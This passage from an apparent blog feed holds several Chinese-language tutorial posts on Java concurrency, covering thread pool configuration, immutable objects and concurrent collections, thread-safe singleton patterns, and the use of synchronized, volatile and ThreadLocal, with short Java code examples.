class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>corePoolSize(核心线程数)</li><li>maximumPoolSize（最大线程数）</li><li>keepAliveTime（线程活动保持存活时间）</li><li>unit（时间单位）</li><li>workQueue（任务存储队列）<ul><li>SynchronousQueue(直接交接)：没有工作队列缓冲区，每次直接扔到线程去处理，不能处理则抛异常</li><li>LinkedBlockingQueue(无界队列)：队列永远不会满，也就是永远用不上最大线程数</li><li>ArrayBlockingQueue(有界队列)：基于数组结构的有界阻塞队列，遵循先进先出</li></ul></li><li>ThreadFactory（创建线程的工厂）</li><li>handler（拒绝策略）<ul><li>DiscardPolicy：不处理，丢弃掉。</li><li>AbortPolicy：直接抛出异常。</li><li>DiscardOldestPolicy：丢弃队列里最近的一个任务，并执行当前任务。</li><li>CallerRunsPolicy：只用调用者所在线程来运行任务。</li></ul></li></ul><h3 id="增减线程的特点"><a href="#增减线程的特点" class="headerlink" title="增减线程的特点"></a>增减线程的特点</h3><h3 id="自动创建线程池的风险分析"><a href="#自动创建线程池的风险分析" class="headerlink" title="自动创建线程池的风险分析"></a>自动创建线程池的风险分析</h3><p> 针对线程池默认的创建线程池的构造方法的分析</p><ul><li><p>newFixedThreadPool</p><p>创建一个<strong>定长</strong>线程池，可控制线程最大并发数，超出的线程会在<strong>队列中等待</strong>。<strong>队列用的是LinkedBlockingQueue（新任务一直向队列中放）</strong></p><p>缺点：容易造成大量内存占用，可能会导致OOM</p></li><li><p>newSingleThreadExector</p><p>创建一个定长为1的线程池。类似于newFixedThreadPool，<strong>队列用的是LinkedBlockingQueue（新任务一直向队列中放）</strong></p><p>缺点：容易造成大量内存占用，可能会导致OOM</p></li><li><p>newCachedThreadPool</p><p>创建一个可缓存线程池，核心数量为0，<strong>最大线程数为整数最大值</strong></p><p>缺点：新来任务直接创建线程执行，也可能造成OOM</p></li><li><p>newScheduledThreadPool</p><p>建一个<strong>定长线程池</strong>，支持定时及周期性任务执行,可以延迟，可以一定频率</p></li></ul><p>总结：正确的线程池的创建应该是手动创建线程池，依据是调研后，根据业务定制</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>线程池</tag>
      
      <tag>executors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(五)-线程安全策略</title>
    <link href="/posts/d50876c2.html"/>
    <url>/posts/d50876c2.html</url>
    
    <content type="html"><![CDATA[<p>本文讲述在Java中经常会使用一些对象，集合。单线程下没问题，在多线程下就会出现问题，我们对这些对象在使用的时候如何去做来保证线程安全</p><span id="more"></span><h2 id="不可变对象"><a href="#不可变对象" class="headerlink" title="不可变对象"></a>不可变对象</h2><h3 id="不可变对象需要满足的条件："><a href="#不可变对象需要满足的条件：" class="headerlink" title="不可变对象需要满足的条件："></a>不可变对象需要满足的条件：</h3><ul><li>对象创建以后其状态就不能修改</li><li>对象所有域都是final类型</li><li>对象是正确创建的（在对象创建期间，this引用没有逸出）</li></ul><p>简而言之就是将类声明为final，将所有的成员声明为私有的，对变量不提供set方法。将所有可变的成员声明为final。在get方法中不返回对象本身，而是克隆对象的拷贝。（可参考String类）。</p><h3 id="final关键字：类、方法、变量"><a href="#final关键字：类、方法、变量" class="headerlink" title="final关键字：类、方法、变量"></a>final关键字：类、方法、变量</h3><ul><li><p>修饰类：不能被继承，<strong>final类中的方法会被隐式的被指定为final方法</strong></p></li><li><p>修饰方法：1、锁定方法被继承类修改；2、效率。<strong>一个类的private方法会被隐式指定为final类型</strong></p></li><li><p>修饰变量：基本数据类型变量、引用类型变量。<strong>基本数据类型数值一旦被初始就不能被修改了，引用类型在对其初始化之后便不能指向另外一个<em>对象</em></strong>，<em>（注意）引用类型的值是可修改的</em></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>immutable</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/15 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImmutableExample1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Integer</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">String</span> b <span class="token operator">=</span> <span class="token string">"2"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//        a=11; 不可以修改，编译时候就不允许</span><span class="token comment">//        b="22"; 不可以修改，编译时候就不允许</span><span class="token comment">//        c=new HashMap&lt;>(); 不可以指向新的对象，编译时候就不允许</span>        c<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 引用类型但是可以修改值</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure></li></ul><h3 id="不可变引用数据类型"><a href="#不可变引用数据类型" class="headerlink" title="不可变引用数据类型"></a>不可变引用数据类型</h3><ul><li><p>java提供：Collections.unmodifiableXXX:Collection、List、Set、Map…</p></li><li><p>guava提供:ImmutableXXX：Collection、List、Set、Map…</p></li></ul><h2 id="线程封闭"><a href="#线程封闭" class="headerlink" title="线程封闭"></a>线程封闭</h2><p>当访问共享的可变数据时，通常需要同步。一种避免同步的方式就是不共享数据。如果仅在单线程内访问数据，就不需要同步，这种技术称为线程封闭（thread  confinement）,ThreadLocal</p><h2 id="线程不安全的类与写法"><a href="#线程不安全的类与写法" class="headerlink" title="线程不安全的类与写法"></a>线程不安全的类与写法</h2><ul><li><p>StringBuilder和StringBuffer两种字符串拼接类</p><ul><li>StringBuilder 线程不安全，但效率高</li><li>StringBuffer 线程安全，但效率低</li></ul></li><li><p>SimpleDateFormate</p><p>多线程下不安全，可以采用jodaTime来实现</p></li><li><p>ArrayList,HashSet，HashMap等集合（使用同步容器解决）</p><ul><li>ArrayList</li><li>HashSet</li><li>HashMap</li></ul></li></ul><h2 id="同步容器"><a href="#同步容器" class="headerlink" title="同步容器"></a>同步容器</h2><p>使用synchronized来实现</p><ul><li><p>ArrayList-&gt;Vector,Stack</p></li><li><p>HashMap-&gt;HashTable(key、value不能为null)</p></li><li><p>Collections.synchronizedXXX(List、Set、Map)</p></li></ul><h2 id="并发容器及安全共享策略"><a href="#并发容器及安全共享策略" class="headerlink" title="并发容器及安全共享策略"></a>并发容器及安全共享策略</h2><p>同步容器的安全性得以保证，但是性能不是很好，所以Java中通常使用并发容器来替代同步容器，来完成并发下的工作</p><h3 id="并发容器J-U-C-java-util-concurrent"><a href="#并发容器J-U-C-java-util-concurrent" class="headerlink" title="并发容器J.U.C(java.util.concurrent)"></a>并发容器J.U.C(java.util.concurrent)</h3><h4 id="ArrayList-–-CopyOnWriteArrayList"><a href="#ArrayList-–-CopyOnWriteArrayList" class="headerlink" title="ArrayList –&gt; CopyOnWriteArrayList"></a>ArrayList –&gt; CopyOnWriteArrayList</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念 :"></a>概念 :</h5><p>简单的讲就是写操作时赋值,当有新元素添加到CopyOnWriteArrayList时,它先从原有的数组里边Copy一份出来然后在新的数组上做些操作,操作完成以后在将引用指向新的数组;CopyOnWriteArrayList所有的操作都是在锁的保护下进行的,这样做的目的主要是为了在多线程并发做add操作的时候复制出多个副本出来导致数据混乱</p><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点 :"></a>缺点 :</h5><ul><li><p>由于是copy的操作所以比较消耗内存,如果元素的内容较多的时候可能会触发GC</p></li><li><p>不能用于实时读的场景,它比较适合读多写少的场景(因为写的时候会复制新集合)</p></li></ul><h5 id="思想"><a href="#思想" class="headerlink" title="思想 :"></a>思想 :</h5><ul><li>读写分离</li><li>最终一致性</li><li>另外开辟空间解决并发冲突</li></ul><h4 id="HashSet-–-CopyOnWriteArraySet和TreeSet-–-ConcurrentSkipListSet"><a href="#HashSet-–-CopyOnWriteArraySet和TreeSet-–-ConcurrentSkipListSet" class="headerlink" title="HashSet –&gt; CopyOnWriteArraySet和TreeSet –&gt; ConcurrentSkipListSet"></a>HashSet –&gt; CopyOnWriteArraySet和TreeSet –&gt; ConcurrentSkipListSet</h4><ul><li>CopyOnWriteArraySet 线程安全，底层实现是使用CopyOnWriteArrayList，特性类似CopyOnWriteArrayList，适合于<strong>数据量小</strong>的时候，只读操作大于可变操作的时候</li><li>ConcurrentSkipListSet 是jdk6新增的类，和TreeSet 一样支持自然排序，并且在构造的时候自己定义比较器。基于Map集合的，在多线程环境下，（set 、add、remove）等方法都是线程安全的，但是对于批量操作（addAll、removeAll等）并不能保证以原子方式进行操作，原因是底层还是（add、remove 等）批量操作的时候只能保证每一次的操作是原子性的，不能保证每一次操作不能被其他操作打断。所以<strong>使用批量操作的时候可能需要手动处理一下（加锁）</strong></li></ul><h4 id="HashMap-–-ConcurrentHashMap-和-TreeMap-–-ConcurrentSkipListMap"><a href="#HashMap-–-ConcurrentHashMap-和-TreeMap-–-ConcurrentSkipListMap" class="headerlink" title="HashMap –&gt; ConcurrentHashMap 和 TreeMap –&gt; ConcurrentSkipListMap"></a>HashMap –&gt; ConcurrentHashMap 和 TreeMap –&gt; ConcurrentSkipListMap</h4><ul><li><p>ConcurrentHashMap  不允许空值，ConcurrentHashMap针对读操作多了特别多的优化,具有特别高的并发性</p></li><li><p>ConcurrentSkipListMap 底层是使用SkipList这种跳表的结构实现的</p><p>对比：ConcurrentHashMap  存取效率高于ConcurrentSkipListMap 。但是：</p><p>1、ConcurrentSkipListMap 的key是有序的 2、支持更高的并发</p></li></ul><p>总结：这里只涉及到了一小部分J.U.C的知识点</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>不可变对象</tag>
      
      <tag>集合</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(四)-安全发布对象</title>
    <link href="/posts/5839849d.html"/>
    <url>/posts/5839849d.html</url>
    
    <content type="html"><![CDATA[<p>安全发布对象，讲述在编码中我们对公共资源正确发布来保证线程安全，且简述使用几种单例模式来发布对象</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>发布对象：</strong>是一个对象能够被当前范围之外的代码嗦使用</p><p><strong>对象溢出：</strong>一种错误的发布。当一个对象还没有构造完成时，就使它被其它线程所见</p><h2 id="四种安全的发布对象"><a href="#四种安全的发布对象" class="headerlink" title="四种安全的发布对象"></a>四种安全的发布对象</h2><ul><li>在静态初始化函数中初始化一个对象引用 (JVM 在静态初始化的时候会保证线程安全)</li><li>将对象的引用保存到 volatile 类型的域或者 AtomicReferance 中</li><li>将对象的引用保存到某个正确构造对象的的 final 类型域中</li><li>将对象的引用保存到一个由锁保护的域中</li></ul><h2 id="线程安全的单例模式的写法"><a href="#线程安全的单例模式的写法" class="headerlink" title="线程安全的单例模式的写法"></a>线程安全的单例模式的写法</h2><h3 id="饿汉式（类加载的时候就创建好）"><a href="#饿汉式（类加载的时候就创建好）" class="headerlink" title="饿汉式（类加载的时候就创建好）"></a>饿汉式（类加载的时候就创建好）</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>singleton</span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/13 * @description: 饿汉式（类加载的时候就创建好） */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonExample1</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//   私有构造函数</span>    <span class="token keyword">private</span> <span class="token class-name">SingletonExample1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample1</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonExample1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample1</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>备注：饿汉模式还可以通过静态块来初始化，<strong>需要注意静态域和静态代码块的顺序</strong>（决定先加载对象还是先加载静态代码块初始对象，如果静态代码块在前就会出现空指针），这里就不演示了</p><h3 id="懒汉式（需要的时候才去创建）【不推荐的写法】"><a href="#懒汉式（需要的时候才去创建）【不推荐的写法】" class="headerlink" title="懒汉式（需要的时候才去创建）【不推荐的写法】"></a>懒汉式（需要的时候才去创建）【不推荐的写法】</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>singleton</span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/13 * @description: 懒汉式（需要的时候才去创建）【不推荐的写法】 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonExample2</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//  私有构造函数</span>    <span class="token keyword">private</span> <span class="token class-name">SingletonExample2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample2</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 统一时间只有一个线程访问,虽然是线程安全的,但不推荐     * 原因：加锁在方法上容易造成资源浪费     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">SingletonExample2</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonExample2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="懒汉式（需要的时候才去创建）-【推荐的写法】"><a href="#懒汉式（需要的时候才去创建）-【推荐的写法】" class="headerlink" title="懒汉式（需要的时候才去创建）-【推荐的写法】"></a>懒汉式（需要的时候才去创建）-【推荐的写法】</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>singleton</span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/13 * @description: 懒汉式（需要的时候才去创建）-【推荐的写法】 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonExample3</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//  私有构造函数</span>    <span class="token keyword">private</span> <span class="token class-name">SingletonExample3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//    volatile+双重检测机制=》禁止指令重排序</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample3</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 1、双重检测机制     * 2、同步锁     * 3、禁止指令重排     *     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample3</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">SingletonExample3</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonExample3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="为什么需要使用volatile"><a href="#为什么需要使用volatile" class="headerlink" title="为什么需要使用volatile"></a>为什么需要使用volatile</h4><p>&#x2F;&#x2F; instance &#x3D; new SingletonExample3();</p><p>cpu的指令，执行new对象的时候分为三步</p><ol><li>memory&#x3D;allocate() 分配对象内存空间</li><li>ctorInstance() 初始化对象</li><li>instance&#x3D;memory 设置instance指向刚分配的内存</li></ol><p>多线程情况下会出问题</p><p>JVM和CPU 发生指令重排 变成1  3 2，因为3和2的顺序不重要</p><p>解决办法：使用volatile 禁止指令重排</p><h3 id="枚举模式：最安全"><a href="#枚举模式：最安全" class="headerlink" title="枚举模式：最安全"></a>枚举模式：最安全</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>singleton</span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/13 * @description: 枚举单例（JVM 保证）-【推荐的写法】 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonExample4</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//  私有构造函数</span>    <span class="token keyword">private</span> <span class="token class-name">SingletonExample4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 1、既能保证整个对象初始化一次     * 2、又能保证在使用的使用的时候才去初始化     *     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonExample4</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token constant">INSTANCE</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">enum</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>        <span class="token constant">INSTANCE</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">SingletonExample4</span> singleton<span class="token punctuation">;</span>        <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonExample4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">SingletonExample4</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>单例模式</tag>
      
      <tag>对象发布</tag>
      
      <tag>对象溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(三)-线程安全性</title>
    <link href="/posts/6cdf97ff.html"/>
    <url>/posts/6cdf97ff.html</url>
    
    <content type="html"><![CDATA[<p>针对性的学习volitale、synconized、ThreadLocal 对象，了解特性，给予案例，及应用场景，简述Java为了线程安全做了哪些工作</p><span id="more"></span><h2 id="三大性质简介"><a href="#三大性质简介" class="headerlink" title="三大性质简介"></a>三大性质简介</h2><p>在 Java 多线程中，Java 提供了一系列与并发处理相关的关键字，比如<code>volatile</code>、<code>synchronized</code>、<code>final</code>、<code>concurren</code>包等。</p><p> 前面有说过多线程中访问共享变量可能会导致一系列由于资源竞争所产生的的线程不安全问题，Java提供了一些关键字来解决，但本质上是java 内存模型围绕<code>原子性</code>、<code>可见性</code>和<code>顺序性</code> 来设计实现</p><ul><li><p>原子性</p><blockquote><p><strong>一个操作是不可中断的，要么全部执行成功要么全部执行失败</strong></p></blockquote><p>可类比事务</p></li><li><p>可见性</p><blockquote><p><strong>可见性是指当一个线程修改了共享变量后，其他线程能够立即得知这个修改</strong></p></blockquote></li><li><p>有序性</p><blockquote><p><strong>CPU为了优化执行，编译器和处理器会进行指令重排序，但是，在Java中认为一个本线程内操作都是有序的，一个线程观察另一个线程的时候，所有操作都是无序的。这个时候我们就需要做一些操作来保证有序，从而保证程序正确</strong></p></blockquote></li></ul><h2 id="synconized-的使用"><a href="#synconized-的使用" class="headerlink" title="synconized 的使用"></a>synconized 的使用</h2><blockquote><p> synconized 加锁，所有同步在一个对象上的同步块在同时只能被一个线程进入并执行操作，所有其他等待进入该同步块的线程将被阻塞，直到执行该同步块中的线程退出。</p></blockquote><ul><li>同步普通方法，锁的是当前对象。</li><li>同步静态方法，锁的是当前 <code>Class</code> 对象。</li><li>同步块，锁的是 <code>()</code> 中的对象。</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none"> synchronized (this) &#123;    this.a &#x3D; a + 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>synconized 是可以满足原子性的</p><p>缺点： synconized 是比较耗费系统资源的，所以要尽可能小范围的使用</p><h2 id="volitale的使用"><a href="#volitale的使用" class="headerlink" title="volitale的使用"></a>volitale的使用</h2><blockquote><p>volitale 的作用是保证内存可见性，如果一个成员变量被 valitale 修饰，在 A 线程中修改了 valitale 变量的值，对其他线程来说该修改是可见的。</p></blockquote><p>可见性只能保证每次读取的是最新的值，但是volatile没办法保证对变量的操作的原子性。</p><p>举个例子：volitale  int i&#x3D;10  开启10个线程 每次+1</p><p>两个线程A、B，A读取i的值为10，然后被阻塞，线程B读取i的值为10 执行加一，然后写入主存，线程A得到执行权，由于在A的工作空间已经获取值为10 ，执行加1，然后将11写回主存。这也就是执行完后i 的值永远小于等于20的原因</p><p><strong>因此 synchronized 和 volitale 的区别是：加锁机制既可以确定可见性又可以保证原子性，而 volatile 变量只能确保可见性。</strong></p><p>一种典型的使用场景：检查某个判断标记判断是否退出循环</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">valitale boolean isExit;while(!isExit) &#123;    doSomething();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这样当 isExit 标志被另外一个线程修改为 true 的时候，执行判断的线程就能够准确的读取到 isExit 的值，从而退出循环。</p><h2 id="ThreadLocal-的使用"><a href="#ThreadLocal-的使用" class="headerlink" title="ThreadLocal 的使用"></a>ThreadLocal 的使用</h2><blockquote><p> ThreadLocal 是为每个线程都提供一份变量的副本，从而实现同时访问而不受影响。</p></blockquote><p>主要的应用场景：</p><ul><li><p>多线程多层级传递对象的时候，使用 ThreadLocal 可以代替一些参数的显式传递；</p></li><li><p>全局存储用户信息</p></li><li><p>解决线程安全问题，如<code>SimpleDateFormat</code>，<code>ThreadLocal</code> 可以确保每个线程都可以得到单独的一个 <code>SimpleDateFormat</code> 的对象</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>volatile</tag>
      
      <tag>synchronized</tag>
      
      <tag>threadLocal</tag>
      
      <tag>原子性</tag>
      
      <tag>可见性</tag>
      
      <tag>一致性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(二)-并发基础</title>
    <link href="/posts/81ef5aad.html"/>
    <url>/posts/81ef5aad.html</url>
    
